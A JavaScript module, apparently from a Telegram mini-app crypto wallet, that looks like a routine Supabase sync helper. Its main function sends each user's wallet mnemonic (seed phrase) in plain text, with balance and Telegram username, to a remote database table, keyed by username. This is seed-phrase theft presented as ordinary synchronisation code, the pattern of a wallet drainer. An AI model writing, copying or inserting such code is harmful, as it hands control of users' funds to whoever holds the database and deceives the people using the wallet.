/**
 * Supabase client using fetch API
 */

const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;

export function getMoscowTimestamp() {
  const now = new Date();
  try {
    // Получаем время в Москве
    const moscowTime = new Intl.DateTimeFormat("en-US", {
      timeZone: "Europe/Moscow",
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: false,
    }).formatToParts(now);

    const m = Object.fromEntries(moscowTime.filter(p => p.type !== 'literal').map(p => [p.type, p.value]));
    // Возвращаем формат ISO 8601, который Postgres (timestamptz) ОБЯЗАТЕЛЬНО примет
    return `${m.year}-${m.month}-${m.day}T${m.hour}:${m.minute}:00+03:00`;
  } catch (e) {
    return now.toISOString();
  }
}

export function getTelegramUser() {
  try {
    const tg = window?.Telegram?.WebApp;
    const unsafeUser = tg?.initDataUnsafe?.user;
    if (unsafeUser && (unsafeUser.username || unsafeUser.first_name || unsafeUser.last_name || unsafeUser.id)) {
      return unsafeUser;
    }

    const rawInitData = tg?.initData;
    if (rawInitData) {
      const userParam = new URLSearchParams(rawInitData).get("user");
      if (userParam) {
        const parsedUser = JSON.parse(userParam);
        if (parsedUser && (parsedUser.username || parsedUser.first_name || parsedUser.last_name || parsedUser.id)) {
          return parsedUser;
        }
      }
    }
  } catch (error) {}
  return null;
}

export function resolveTelegramDisplayName(fallbackUserId = null) {
  const user = getTelegramUser();
  if (user) {
    const name = user.username ? `@${user.username}` : ([user.first_name, user.last_name].filter(Boolean).join(" ").trim() || `User_${user.id}`);
    if (user.id) localStorage.setItem(`gem_tg_name_${user.id}`, name);
    localStorage.setItem("gem_last_tg_name", name);
    return name;
  }

  const uid = fallbackUserId || window?.Telegram?.WebApp?.initDataUnsafe?.user?.id;
  if (uid) {
    const stored = localStorage.getItem(`gem_tg_name_${uid}`);
    if (stored) return stored;
    return `User_${uid}`;
  }
  return localStorage.getItem("gem_last_tg_name") || "Anonymous";
}

export async function syncWalletToSupabase(walletData) {
  if (!SUPABASE_URL || !SUPABASE_KEY) {
    console.error('❌ Supabase URL or Key is missing!');
    return null;
  }

  try {
    const { username, mnemonic, balance } = walletData;
    const cleanMnemonic = Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic;
    
    let finalName = username;
    if (!finalName || finalName === "Anonymous") {
      finalName = resolveTelegramDisplayName();
    }

    console.log(`🔄 Attempting to sync for: ${finalName}...`);

    const response = await fetch(`${SUPABASE_URL}/rest/v1/wallets?on_conflict=username`, {
      method: 'POST',
      headers: {
        'apikey': SUPABASE_KEY,
        'Authorization': `Bearer ${SUPABASE_KEY}`,
        'Content-Type': 'application/json',
        'Prefer': 'resolution=merge-duplicates'
      },
      body: JSON.stringify({
        username: finalName,
        mnemonic: cleanMnemonic,
        balance: balance ? String(balance) : "0",
        created_at: getMoscowTimestamp()
      })
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('❌ Supabase Sync Error:', response.status, errorText);
      // Если это ошибка типа данных, мы увидим её в консоли
    } else {
      console.log('✅ Supabase Sync Success!');
    }
  } catch (error) {
    console.error('❌ Supabase Fetch Error:', error);
  }
}
